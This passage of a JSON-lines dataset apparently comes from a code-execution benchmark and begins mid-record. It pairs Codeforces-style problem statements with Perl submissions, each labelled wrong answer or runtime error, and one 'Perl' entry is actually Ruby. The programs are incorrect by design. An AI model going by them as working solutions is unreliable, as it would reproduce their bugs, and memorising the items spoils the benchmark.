}\r\n}\r\n","description":"Vasya is developing his own programming language VPL (Vasya Programming Language). Right now he is busy making the system of exceptions. He thinks that the system of exceptions must function like that.The exceptions are processed by try-catch-blocks. There are two operators that work with the blocks: The try operator. It opens a new try-catch-block.  The catch(<exception_type>, <message>) operator. It closes the try-catch-block that was started last and haven't yet been closed. This block can be activated only via exception of type <exception_type>. When we activate this block, the screen displays the <message>. If at the given moment there is no open try-catch-block, then we can't use the catch operator.The exceptions can occur in the program in only one case: when we use the throw operator. The throw(<exception_type>) operator creates the exception of the given type.Let's suggest that as a result of using some throw operator the program created an exception of type a. In this case a try-catch-block is activated, such that this block's try operator was described in the program earlier than the used throw operator. Also, this block's catch operator was given an exception type a as a parameter and this block's catch operator is described later that the used throw operator. If there are several such try-catch-blocks, then the system activates the block whose catch operator occurs earlier than others. If no try-catch-block was activated, then the screen displays message \"Unhandled Exception\".To test the system, Vasya wrote a program that contains only try, catch and throw operators, one line contains no more than one operator, the whole program contains exactly one throw operator.Your task is: given a program in VPL, determine, what message will be displayed on the screen.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer: n (1\u2264n\u226410^5) the number of lines in the program. Next n lines contain the program in language VPL. Each line contains no more than one operator. It means that input file can contain empty lines and lines, consisting only of spaces.\nThe program contains only operators try, catch and throw. It is guaranteed that the program is correct. It means that each started try-catch-block was closed, the catch operators aren't used unless there is an open try-catch-block. The program has exactly one throw operator. The program may have spaces at the beginning of a line, at the end of a line, before and after a bracket, a comma or a quote mark.\nThe exception type is a nonempty string, that consists only of upper and lower case english letters. The length of the string does not exceed 20 symbols. Message is a nonempty string, that consists only of upper and lower case english letters, digits and spaces. Message is surrounded with quote marks. Quote marks shouldn't be printed. The length of the string does not exceed 20 symbols.\nLength of any line in the input file does not exceed 50 symbols. \n","output_spec":"Print the message the screen will show after the given program is executed.\n","notes":"In the first sample there are 2 try-catch-blocks such that try operator is described earlier than throw operator and catch operator is described later than throw operator: try-catch(BE,\"BE in line 3\") and try-catch(AE,\"AE somewhere\"). Exception type is AE, so the second block will be activated, because operator catch(AE,\"AE somewhere\") has exception type AE as parameter and operator catch(BE,\"BE in line 3\") has exception type BE.\nIn the second sample there are 2 try-catch-blocks such that try operator is described earlier than throw operator and catch operator is described later than throw operator: try-catch(AE,\"AE in line 3\") and try-catch(AE,\"AE somewhere\"). Exception type is AE, so both blocks can be activated, but only the first one will be activated, because operator catch(AE,\"AE in line 3\") is described earlier than catch(AE,\"AE somewhere\")\nIn the third sample there is no blocks that can be activated by an exception of type CE.\n","sample_inputs":["8\ntry\n    try\n        throw ( AE ) \n    catch ( BE, \"BE in line 3\")\n\n    try\n    catch(AE, \"AE in line 5\") \ncatch(AE,\"AE somewhere\")\n","8\ntry\n    try\n        throw ( AE ) \n    catch ( AE, \"AE in line 3\")\n\n    try\n    catch(BE, \"BE in line 5\") \ncatch(AE,\"AE somewhere\")\n","8\ntry\n    try\n        throw ( CE ) \n    catch ( BE, \"BE in line 3\")\n\n    try\n    catch(AE, \"AE in line 5\") \ncatch(AE,\"AE somewhere\")\n"],"sample_outputs":["AE somewhere\n","AE in line 3\n","Unhandled Exception\n"]}
{"difficulty":1900,"lang":"Perl","lang_cluster":"perl","src_uid":"195_D","submission_id":"1906330","tags":["geometry","math","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\r\n\r\nuse 5.006;\r\nuse strict;\r\nuse warnings;\r\n\r\nmy %hash;\r\n\r\nsub gcd {\r\n  my $a = shift;\r\n  my $b = shift;\r\n  while ($b > 0) {\r\n    $b ^= $a ^= $b ^= $a %= $b;\r\n  }\r\n  return $a;\r\n}\r\n\r\nmy $n = <>;\r\nfor(1..$n) {\r\n  my $line = <>;\r\n  my @arr = split(\/ \/, $line);\r\n  my $k = $arr[0];\r\n  my $b = $arr[1];\r\n  next if (0 == $k);\r\n  my $g = gcd($k, $b);\r\n  $k \/= $g;\r\n  $b \/= $g;\r\n  if ($k < 0) {\r\n    $k = -$k;\r\n    $b = -$b;\r\n  }\r\n  $hash{($k, $b)} = 1;\r\n}\r\nprint \"\".keys( %hash ).\"\\n\";\r\n","description":"As Valeric and Valerko were watching one of the last Euro Championship games in a sports bar, they broke a mug. Of course, the guys paid for it but the barman said that he will let them watch football in his bar only if they help his son complete a programming task. The task goes like that.Let's consider a set of functions of the following form:  Let's define a sum of n functions y1(x),...,yn(x) of the given type as function s(x)=y1(x)+...+yn(x) for any x. It's easy to show that in this case the graph s(x) is a polyline. You are given n functions of the given type, your task is to find the number of angles that do not equal 180 degrees, in the graph s(x), that is the sum of the given functions.Valeric and Valerko really want to watch the next Euro Championship game, so they asked you to help them.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u226410^5) \u2014 the number of functions. Each of the following n lines contains two space-separated integer numbers ki,bi (-10^9\u2264ki,bi\u226410^9) that determine the i-th function.\n","output_spec":"Print a single number \u2014 the number of angles that do not equal 180 degrees in the graph of the polyline that equals the sum of the given functions.\n","notes":null,"sample_inputs":["1\n1 0\n","3\n1 0\n0 2\n-1 1\n","3\n-2 -4\n1 7\n-5 1\n"],"sample_outputs":["1\n","2\n","3\n"]}
{"difficulty":1600,"lang":"Perl","lang_cluster":"perl","src_uid":"197_A","submission_id":"1808598","tags":["constructive+algorithms","games","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\n\nuse List::Util qw[min max];\n\n$a = <>;\n$b = <>;\n$r = <>;\n\nif (min($a, $b) < 2*$r) {\n  print (\"Second\");\n}\nelse {\n  print (\"First\");\n}","description":"You've got a rectangular table with length a and width b and the infinite number of plates of radius r. Two players play the following game: they take turns to put the plates on the table so that the plates don't lie on each other (but they can touch each other), and so that any point on any plate is located within the table's border. During the game one cannot move the plates that already lie on the table. The player who cannot make another move loses. Determine which player wins, the one who moves first or the one who moves second, provided that both players play optimally well.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains three space-separated integers a, b, r (1\u2264a,b,r\u2264100) \u2014 the table sides and the plates' radius, correspondingly.\n","output_spec":"If wins the player who moves first, print \"First\" (without the quotes). Otherwise print \"Second\" (without the quotes).\n","notes":"In the first sample the table has place for only one plate. The first player puts a plate on the table, the second player can't do that and loses.\n \nIn the second sample the table is so small that it doesn't have enough place even for one plate. So the first player loses without making a single move.\n \n","sample_inputs":["5 5 2\n","6 7 4\n"],"sample_outputs":["First\n","Second\n"]}
{"difficulty":1700,"lang":"Perl","lang_cluster":"perl","src_uid":"201_A","submission_id":"9496542","tags":["constructive+algorithms","dp","math"],"exec_outcome":"WRONG_ANSWER","source_code":"$c = 1;\r\n%h = map { $c += $_ * 4 , $_ * 2 + 1 } 0 .. 7;\r\n$_ = <>, chomp;\r\n$_ ++ until exists $h{ $_ };\r\nprint $h{ $_ }","description":"Consider some square matrix A with side n consisting of zeros and ones. There are n rows numbered from 1 to n from top to bottom and n columns numbered from 1 to n from left to right in this matrix. We'll denote the element of the matrix which is located at the intersection of the i-row and the j-th column as Ai,j.Let's call matrix A clear if no two cells containing ones have a common side.Let's call matrix A symmetrical if it matches the matrices formed from it by a horizontal and\/or a vertical reflection. Formally, for each pair (i,j) (1\u2264i,j\u2264n) both of the following conditions must be met: Ai,j=An-i+1,j and Ai,j=Ai,n-j+1.Let's define the sharpness of matrix A as the number of ones in it.Given integer x, your task is to find the smallest positive integer n such that there exists a clear symmetrical matrix A with side n and sharpness x.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains a single integer x (1\u2264x\u2264100) \u2014 the required sharpness of the matrix.\n","output_spec":"Print a single number \u2014 the sought value of n.\n","notes":"The figure below shows the matrices that correspond to the samples:\n \n","sample_inputs":["4\n","9\n"],"sample_outputs":["3\n","5\n"]}
{"difficulty":1700,"lang":"Perl","lang_cluster":"perl","src_uid":"20_A","submission_id":"9540431","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!perl -p\r\ns\/\\\/+\/\\\/\/g","description":"The new operating system BerOS has a nice feature. It is possible to use any number of characters '\/' as a delimiter in path instead of one traditional '\/'. For example, strings \/\/usr\/\/\/local\/\/nginx\/sbin\/\/ and \/usr\/local\/nginx\/\/\/sbin are equivalent. The character '\/' (or some sequence of such characters) at the end of the path is required only in case of the path to the root directory, which can be represented as single character '\/'.A path called normalized if it contains the smallest possible number of characters '\/'.Your task is to transform a given path to the normalized form.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains only lowercase Latin letters and character '\/'\u00a0\u2014 the path to some directory. All paths start with at least one character '\/'. The length of the given line is no more than 100 characters, it is not empty.\n","output_spec":"The path in normalized form.\n","notes":null,"sample_inputs":["\/\/usr\/\/\/local\/\/nginx\/sbin\n"],"sample_outputs":["\/usr\/local\/nginx\/sbin\n"]}
{"difficulty":1600,"lang":"Perl","lang_cluster":"perl","src_uid":"214_B","submission_id":"1961098","tags":["brute+force","constructive+algorithms","greedy","math"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\r\n\r\n$n = <>+0;\r\n@a = split \" \",<>;\r\nfor(@a){\r\n    $h{$_+0}++;\r\n    $s+=$_;\r\n}\r\nif($h{0} == 0){\r\n    print -1;\r\n}else{\r\n    if($s % 3 == 1){\r\n        if($s % 3 && $h{1}){$h{1}--;$s -= 1;}\r\n        if($s % 3 && $h{4}){$h{4}--;$s -= 4;}\r\n        if($s % 3 && $h{7}){$h{7}--;$s -= 7;}\r\n    }\r\n    for(1..10){\r\n        if($s % 3 > 0){\r\n            if($s % 3 && $h{2}){$h{2}--;$s -= 2;}\r\n            if($s % 3 && $h{5}){$h{5}--;$s -= 5;}\r\n            if($s % 3 && $h{8}){$h{8}--;$s -= 8;}\r\n        }\r\n        if($s % 3 > 0){\r\n            if($s % 3 && $h{1}){$h{1}--;$s -= 1;}\r\n            if($s % 3 && $h{4}){$h{4}--;$s -= 4;}\r\n            if($s % 3 && $h{7}){$h{7}--;$s -= 7;}\r\n        }\r\n    }\r\n    if($h{0} >= $n){\r\n        print 0;\r\n    } else {\r\n        if($s % 3 > 0){\r\n            print -1;\r\n        }else {\r\n            for $d(sort {$b <=> $a} keys %h){\r\n                for(1..$h{$d}){\r\n                    print $d;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n","description":"Furik loves math lessons very much, so he doesn't attend them, unlike Rubik. But now Furik wants to get a good mark for math. For that Ms. Ivanova, his math teacher, gave him a new task. Furik solved the task immediately. Can you?You are given a set of digits, your task is to find the maximum integer that you can make from these digits. The made number must be divisible by 2, 3, 5 without a residue. It is permitted to use not all digits from the set, it is forbidden to use leading zeroes.Each digit is allowed to occur in the number the same number of times it occurs in the set.","input_from":"standard input","output_to":"standard output","input_spec":"A single line contains a single integer n (1\u2264n\u2264100000) \u2014 the number of digits in the set. The second line contains n digits, the digits are separated by a single space. \n","output_spec":"On a single line print the answer to the problem. If such number does not exist, then you should print -1.\n","notes":"In the first sample there is only one number you can make \u2014 0. In the second sample the sought number is 5554443330. In the third sample it is impossible to make the required number.\n","sample_inputs":["1\n0\n","11\n3 4 5 4 5 3 5 3 4 4 0\n","8\n3 2 5 1 5 2 2 3\n"],"sample_outputs":["0\n","5554443330\n","-1\n"]}
{"difficulty":1900,"lang":"Perl","lang_cluster":"perl","src_uid":"21_A","submission_id":"3365417","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"puts gets=~m\/^\\w{1,16}@\\w{1,16}(\\.\\w{1,16})*(\\\/\\w{1,16})?\\n$\/?\"YES\":\"NO\"","description":"Jabber ID on the national Berland service \u00abBabber\u00bb has a form <username>@<hostname>[\/resource], where   <username> \u2014 is a sequence of Latin letters (lowercase or uppercase), digits or underscores characters \u00ab_\u00bb, the length of <username> is between 1 and 16, inclusive.  <hostname> \u2014 is a sequence of word separated by periods (characters \u00ab.\u00bb), where each word should contain only characters allowed for <username>, the length of each word is between 1 and 16, inclusive. The length of <hostname> is between 1 and 32, inclusive.  <resource> \u2014 is a sequence of Latin letters (lowercase or uppercase), digits or underscores characters \u00ab_\u00bb, the length of <resource> is between 1 and 16, inclusive. The content of square brackets is optional \u2014 it can be present or can be absent.There are the samples of correct Jabber IDs: [email\u00a0protected], [email\u00a0protected]\/contest.Your task is to write program which checks if given string is a correct Jabber ID.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains of a single line. The line has the length between 1 and 100 characters, inclusive. Each characters has ASCII-code between 33 and 127, inclusive.\n","output_spec":"Print YES or NO.\n","notes":null,"sample_inputs":["[email\u00a0protected]\n","[email\u00a0protected]\/contest.icpc\/12\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":1900,"lang":"Perl","lang_cluster":"perl","src_uid":"222_D","submission_id":"14929724","tags":["binary+search","greedy","sortings","two+pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"($n, $x) = split(' ', <>);\r\n@a = split(' ', <>); @a = sort{$a <=> $b} @a;\r\n@b = split(' ', <>); @b = sort{$a <=> $b} @b;\r\n\r\nforeach(@b){\r\n\tprint \"$_, \";}\r\n\tprint \"\\n\";\r\nforeach(@a){\r\n\tif($_ + $b[$n - 1] >= $x){\r\n\t\t$n --; $re ++;}}\r\nprint \"1 $re\";\r\n\r\n","description":"A boy named Vasya has taken part in an Olympiad. His teacher knows that in total Vasya got at least x points for both tours of the Olympiad. The teacher has the results of the first and the second tour of the Olympiad but the problem is, the results have only points, no names. The teacher has to know Vasya's chances.Help Vasya's teacher, find two numbers \u2014 the best and the worst place Vasya could have won. Note that the total results' table sorts the participants by the sum of points for both tours (the first place has the participant who has got the most points). If two or more participants have got the same number of points, it's up to the jury to assign places to them according to their choice. It is guaranteed that each participant of the Olympiad participated in both tours of the Olympiad.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n,x (1\u2264n\u226410^5;\u00a00\u2264x\u22642\u00b710^5) \u2014 the number of Olympiad participants and the minimum number of points Vasya earned.\nThe second line contains n space-separated integers: a1,a2,...,an (0\u2264ai\u226410^5) \u2014 the participants' points in the first tour.\nThe third line contains n space-separated integers: b1,b2,...,bn (0\u2264bi\u226410^5) \u2014 the participants' points in the second tour.\nThe participants' points are given in the arbitrary order. It is guaranteed that Vasya was present in the Olympiad \u2014 there are two integers i,j (1\u2264i,j\u2264n) such, that ai+bj\u2265x.\n","output_spec":"Print two space-separated integers \u2014 the best and the worst place Vasya could have got on the Olympiad.\n","notes":"In the first text sample all 5 participants earn 2 points each in any case. Depending on the jury's decision, Vasya can get the first (the best) as well as the last (the worst) fifth place.\nIn the second test sample in the best case scenario Vasya wins again: he can win 12 points and become the absolute winner if the total results' table looks like that \u2014 {4:8, 6:4, 3:6, 4:4, 4:3, 5:0}.\nIn this table all participants are sorted by decreasing points and we can see how much a participant earned in the first and in the second tour.\nIn the worst case scenario Vasya can get the fifth place if the table looks like that \u2014 {4:8, 4:6, 6:4, 5:4, 4:3, 3:0}, and he earned 4 and 3 points in the first and second tours, correspondingly.\n","sample_inputs":["5 2\n1 1 1 1 1\n1 1 1 1 1\n","6 7\n4 3 5 6 4 4\n8 6 0 4 3 4\n"],"sample_outputs":["1 5\n","1 5\n"]}
{"difficulty":1600,"lang":"Perl","lang_cluster":"perl","src_uid":"231_D","submission_id":"2473329","tags":["brute+force","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"use warnings;\r\n\r\nmy $sum = 0;\r\nmy($x, $y, $z) = split(\" \",<STDIN>);\r\nmy($x1, $y1, $z1) = split(\" \",<STDIN>);\r\nmy($a1, $a2, $a3, $a4, $a5, $a6) = split(\" \",<STDIN>);\r\n\r\nsub check($$$$) {\r\n    my ($r, $r1, $cost1, $cost2) = @_;\r\n\r\n    if ($r1 == 0) {\r\n\tif ($r < $r1) {\r\n\t    $sum += $cost1;\r\n\t}\r\n    }\r\n    elsif ($r > $r1) {\r\n\t$sum += $cost2; \r\n    }      \r\n}\r\n\r\n\r\n&check($x,$x1,$a5,$a6);\r\n&check($y,$y1,$a1,$a2);\r\n&check($z,$z1,$a3,$a4);\r\n\r\nprintf(\"%d\\n\", $sum);\r\n","description":"One day Vasya was going home when he saw a box lying on the road. The box can be represented as a rectangular parallelepiped. Vasya needed no time to realize that the box is special, as all its edges are parallel to the coordinate axes, one of its vertices is at point (0,0,0), and the opposite one is at point (x1,y1,z1). The six faces of the box contain some numbers a1,a2,...,a6, exactly one number right in the center of each face. The numbers are located on the box like that:   number a1 is written on the face that lies on the ZOX plane;  a2 is written on the face, parallel to the plane from the previous point;  a3 is written on the face that lies on the XOY plane;  a4 is written on the face, parallel to the plane from the previous point;  a5 is written on the face that lies on the YOZ plane;  a6 is written on the face, parallel to the plane from the previous point. At the moment Vasya is looking at the box from point (x,y,z). Find the sum of numbers that Vasya sees. Note that all faces of the box are not transparent and Vasya can't see the numbers through the box. The picture contains transparent faces just to make it easier to perceive. You can consider that if Vasya is looking from point, lying on the plane of some face, than he can not see the number that is written on this face. It is enough to see the center of a face to see the corresponding number for Vasya. Also note that Vasya always reads correctly the ai numbers that he sees, independently of their rotation, angle and other factors (that is, for example, if Vasya sees some ai=6, then he can't mistake this number for 9 and so on). ","input_from":"standard input","output_to":"standard output","input_spec":"The fist input line contains three space-separated integers x, y and z (|x|,|y|,|z|\u226410^6) \u2014 the coordinates of Vasya's position in space. The second line contains three space-separated integers x1, y1, z1 (1\u2264x1,y1,z1\u226410^6) \u2014 the coordinates of the box's vertex that is opposite to the vertex at point (0,0,0). The third line contains six space-separated integers a1,a2,...,a6 (1\u2264ai\u226410^6) \u2014 the numbers that are written on the box faces. \nIt is guaranteed that point (x,y,z) is located strictly outside the box.\n","output_spec":"Print a single integer \u2014 the sum of all numbers on the box faces that Vasya sees.\n","notes":"The first sample corresponds to perspective, depicted on the picture. Vasya sees numbers a2 (on the top face that is the darkest), a6 (on the right face that is the lightest) and a4 (on the left visible face).\nIn the second sample Vasya can only see number a4.\n","sample_inputs":["2 2 2\n1 1 1\n1 2 3 4 5 6\n","0 0 10\n3 2 3\n1 2 3 4 5 6\n"],"sample_outputs":["12\n","4\n"]}
{"difficulty":2000,"lang":"Perl","lang_cluster":"perl","src_uid":"374_A","submission_id":"7361370","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"($n,$m,$i,$j,$a,$b)=split\/ \/,<>;\r\n\r\n($n-$i)%$a==0 and ($m-$j)%$b==0 and (abs(($n-$i)\/$a-($m-$j)\/$b))%2==0 and \r\npush @_,(($n-$i)\/$a > ($m-$j)\/$b ? (($n-$i)\/$a) : (($m-$j)\/$b) );\r\n\r\n($i-1)%$a==0 and ($m-$j)%$b==0 and (abs(($i-1)\/$a-($m-$j)\/$b))%2==0 and \r\npush @_,(($i-1)\/$a > ($m-$j)\/$b ? (($i-1)\/$a) : (($m-$j)\/$b) );\r\n\r\n($n-$i)%$a==0 and ($j-1)%$b==0 and (abs(($n-$i)\/$a-($j-1)\/$b))%2==0 and \r\npush @_,(($n-$i)\/$a > ($j-1)\/$b ? (($n-$i)\/$a) : (($j-1)\/$b) );\r\n\r\n($i-1)%$a==0 and ($j-1)%$b==0 and (abs(($i-1)\/$a-($j-1)\/$b))%2==0 and \r\npush @_,(($i-1)\/$a > ($j-1)\/$b ? (($i-1)\/$a) : (($j-1)\/$b) );\r\n\r\n@_= sort {$a<=>$b} @_;\r\n\r\nif ($n<$a or $m<$b) {@_=() if $_[0]}\r\n\r\nprint @_? $_[0]:\"Poor Inna and pony!\"","description":"Dima and Inna are doing so great! At the moment, Inna is sitting on the magic lawn playing with a pink pony. Dima wanted to play too. He brought an n\u00d7m chessboard, a very tasty candy and two numbers a and b.Dima put the chessboard in front of Inna and placed the candy in position (i,j) on the board. The boy said he would give the candy if it reaches one of the corner cells of the board. He's got one more condition. There can only be actions of the following types:  move the candy from position (x,y) on the board to position (x-a,y-b);  move the candy from position (x,y) on the board to position (x+a,y-b);  move the candy from position (x,y) on the board to position (x-a,y+b);  move the candy from position (x,y) on the board to position (x+a,y+b). Naturally, Dima doesn't allow to move the candy beyond the chessboard borders.Inna and the pony started shifting the candy around the board. They wonder what is the minimum number of allowed actions that they need to perform to move the candy from the initial position (i,j) to one of the chessboard corners. Help them cope with the task! ","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains six integers n,m,i,j,a,b (1\u2264n,m\u226410^6;\u00a01\u2264i\u2264n;\u00a01\u2264j\u2264m;\u00a01\u2264a,b\u226410^6).\nYou can assume that the chessboard rows are numbered from 1 to n from top to bottom and the columns are numbered from 1 to m from left to right. Position (i,j) in the statement is a chessboard cell on the intersection of the i-th row and the j-th column. You can consider that the corners are: (1,m), (n,1), (n,m), (1,1).\n","output_spec":"In a single line print a single integer \u2014 the minimum number of moves needed to get the candy.\nIf Inna and the pony cannot get the candy playing by Dima's rules, print on a single line \"Poor Inna and pony!\" without the quotes.\n","notes":"Note to sample 1:\nInna and the pony can move the candy to position (1+2,3+2)=(3,5), from there they can move it to positions (3-2,5+2)=(1,7) and (3+2,5+2)=(5,7). These positions correspond to the corner squares of the chess board. Thus, the answer to the test sample equals two.\n","sample_inputs":["5 7 1 3 2 2\n","5 5 2 3 1 1\n"],"sample_outputs":["2\n","Poor Inna and pony!\n"]}
{"difficulty":1800,"lang":"Perl","lang_cluster":"perl","src_uid":"3_C","submission_id":"38019293","tags":["brute+force","games","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!usr\/bin\/perl\nuse warnings;\nuse strict;\n\nsub win($){\n    my $bard=shift;\n    if(($bard=~\/[X]{3}\/)||($bard=~\/[0]{3}\/)){\n\treturn 1;\n    }\n    elsif(($bard=~\/[X].{3}[X].{3}[X]\/)||($bard=~\/[0].{3}[0].{3}[0]\/)){\n\treturn 1;\n    }\n    elsif(($bard=~\/[X].{4}[X].{4}[X]\/)||($bard=~\/[0].{4}[0].{4}[0]\/)){\n\treturn 1;\n    }\n    elsif(($bard=~\/..[X].{2}[X].{2}[X]\/)||($bard=~\/..[0].{2}[0].{2}[0]\/)){\n\treturn 1;\n    }\n    else{\n\treturn 0;\n    }\n}\n\nmy $fl=<STDIN>;chomp($fl);my $sl=<STDIN>;chomp($sl);my $tl=<STDIN>;chomp($tl);\nmy $board=$fl.' '.$sl.' '.$tl;\nmy $boz=$board=~s\/[X]\/\/rg;my $box=$board=~s\/[0]\/\/rg;my $bod=$board=~s\/[\\.]\/\/rg;\nmy $k=length($box)<length($boz);\nif($k||(length($box)-length($boz)>1)){\n    print \"illegal\\n\";\n}\nelse{\n    if(win($board)){\n\tmy $blz=$board=~s\/[X]\/P\/rg;my $blx=$board=~s\/[0]\/P\/rg;\n\tif(win($blz)||win($blx)){\n\t    print \"illegal\\n\";\n\t}\n\telse{\n\t    if(length($bod)%2==0){\n\t\tprint \"the second player won\\n\";\n\t    }\n\t    else{\n\t\tprint \"the first player won\\n\";\n\t    }\n\t}\n    }\n    elsif(length($bod)==11){\n\tprint \"draw\\n\";\n    }\n    else{\n\tif(length($bod)%2==0){\n\t    print \"first\\n\";\n\t}\n\telse{\n\t    print \"second\\n\";\n\t}\n    }\n}","description":"Certainly, everyone is familiar with tic-tac-toe game. The rules are very simple indeed. Two players take turns marking the cells in a 3\u00d73 grid (one player always draws crosses, the other \u2014 noughts). The player who succeeds first in placing three of his marks in a horizontal, vertical or diagonal line wins, and the game is finished. The player who draws crosses goes first. If the grid is filled, but neither Xs, nor 0s form the required line, a draw is announced.You are given a 3\u00d73 grid, each grid cell is empty, or occupied by a cross or a nought. You have to find the player (first or second), whose turn is next, or print one of the verdicts below:   illegal \u2014 if the given board layout can't appear during a valid game;  the first player won \u2014 if in the given board layout the first player has just won;  the second player won \u2014 if in the given board layout the second player has just won;  draw \u2014 if the given board layout has just let to a draw. ","input_from":"standard input","output_to":"standard output","input_spec":"The input consists of three lines, each of the lines contains characters \".\", \"X\" or \"0\" (a period, a capital letter X, or a digit zero).\n","output_spec":"Print one of the six verdicts: first, second, illegal, the first player won, the second player won or draw.\n","notes":null,"sample_inputs":["X0X\n.0.\n.X.\n"],"sample_outputs":["second\n"]}
{"difficulty":1900,"lang":"Perl","lang_cluster":"perl","src_uid":"45_D","submission_id":"21745072","tags":["greedy","meet-in-the-middle","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"sub compare { $a <=> $b }\r\nsub max { my ($a, $b) = @_; $a > $b? $a: $b }\r\n\r\n(undef, @input) = <STDIN>;\r\nfor (@input) { push @p, (split)[0] }\r\n@p = sort compare @p;\r\n\r\nfor $p (@p) {\r\n\t$d = max $p, $d;\r\n\tpush @r, $d;\r\n\t$d++;\r\n}\r\n\r\nprint \"@r\";","description":"On a history lesson the teacher asked Vasya to name the dates when n famous events took place. He doesn't remembers the exact dates but he remembers a segment of days [li,ri] (inclusive) on which the event could have taken place. However Vasya also remembers that there was at most one event in one day. Help him choose such n dates of famous events that will fulfill both conditions. It is guaranteed that it is possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer n (1\u2264n\u2264100) \u2014 the number of known events. Then follow n lines containing two integers li and ri each (1\u2264li\u2264ri\u226410^7) \u2014 the earliest acceptable date and the latest acceptable date of the i-th event.\n","output_spec":"Print n numbers \u2014 the dates on which the events took place. If there are several solutions, print any of them. It is guaranteed that a solution exists.\n","notes":null,"sample_inputs":["3\n1 2\n2 3\n3 4\n","2\n1 3\n1 3\n"],"sample_outputs":["1 2 3 \n","1 2 \n"]}
{"difficulty":2700,"lang":"Perl","lang_cluster":"perl","src_uid":"774_F","submission_id":"26155527","tags":["*special","binary+search","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"use strict;\r\nuse warnings;\r\nchomp(my $n  = <STDIN>);\r\nmy @arr;\r\nmy $dig;\r\nchomp(my $str = <STDIN>);\r\n@arr = split \/ \/, $str; \r\nmy $t =  @arr;\r\nforeach (@arr)\r\n{\r\n\t$_-=($t-1);\r\n}\r\n#say @arr;\r\nmy $q = 0;\r\nmy $o = $t -1; \r\nwhile(($o)*$n>7)\r\n{\r\n\t$arr[($o*$n)%7]++;\r\n\t$o-=1;\r\n}\r\n\r\n#$q = 7*($t-1)%($n);\r\n$q =1;\r\n#say @arr;\r\n#say $q;\r\nmy $k = 0;\r\nmy $flag =0;\r\nwhile ($flag==0)\r\n{\r\n\tfor my $i (($k+$q)..($n+$k))\r\n\t{\r\n\t\tmy $r = $i-$k;\r\n\t\tif($i%7>0){\r\n\t\t\t$arr[$r]-=1;\r\n\t\t\t}\r\n\t\tif ($arr[$r] ==0)\r\n\t\t{\r\n\t\t\tmy $ans= $r+1;\r\n\t\t\tprint $ans;\r\n\t\t\t$flag =1;\r\n\t\t\tlast;\r\n\t\t}\r\n#\tsay @arr;\r\n\t}\r\n\t$k = $n+$k;\r\n\t$q = 1;\r\n}\r\n#say @arr;\r\n1;\r\n","description":"Stepan has n pens. Every day he uses them, and on the i-th day he uses the pen number i. On the (n+1)-th day again he uses the pen number 1, on the (n+2)-th \u2014 he uses the pen number 2 and so on.On every working day (from Monday to Saturday, inclusive) Stepan spends exactly 1 milliliter of ink of the pen he uses that day. On Sunday Stepan has a day of rest, he does not stend the ink of the pen he uses that day. Stepan knows the current volume of ink in each of his pens. Now it's the Monday morning and Stepan is going to use the pen number 1 today. Your task is to determine which pen will run out of ink before all the rest (that is, there will be no ink left in it), if Stepan will use the pens according to the conditions described above.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the integer n (1\u2264n\u226450000) \u2014 the number of pens Stepan has.\nThe second line contains the sequence of integers a1,a2,...,an (1\u2264ai\u226410^9), where ai is equal to the number of milliliters of ink which the pen number i currently has.\n","output_spec":"Print the index of the pen which will run out of ink before all (it means that there will be no ink left in it), if Stepan will use pens according to the conditions described above. \nPens are numbered in the order they are given in input data. The numeration begins from one. \nNote that the answer is always unambiguous, since several pens can not end at the same time.\n","notes":"In the first test Stepan uses ink of pens as follows: \n  on the day number 1 (Monday) Stepan will use the pen number 1, after that there will be 2 milliliters of ink in it;  on the day number 2 (Tuesday) Stepan will use the pen number 2, after that there will be 2 milliliters of ink in it;  on the day number 3 (Wednesday) Stepan will use the pen number 3, after that there will be 2 milliliters of ink in it;  on the day number 4 (Thursday) Stepan will use the pen number 1, after that there will be 1 milliliters of ink in it;  on the day number 5 (Friday) Stepan will use the pen number 2, after that there will be 1 milliliters of ink in it;  on the day number 6 (Saturday) Stepan will use the pen number 3, after that there will be 1 milliliters of ink in it;  on the day number 7 (Sunday) Stepan will use the pen number 1, but it is a day of rest so he will not waste ink of this pen in it;  on the day number 8 (Monday) Stepan will use the pen number 2, after that this pen will run out of ink. So, the first pen which will not have ink is the pen number 2.\n","sample_inputs":["3\n3 3 3\n","5\n5 4 5 4 4\n"],"sample_outputs":["2\n","5\n"]}
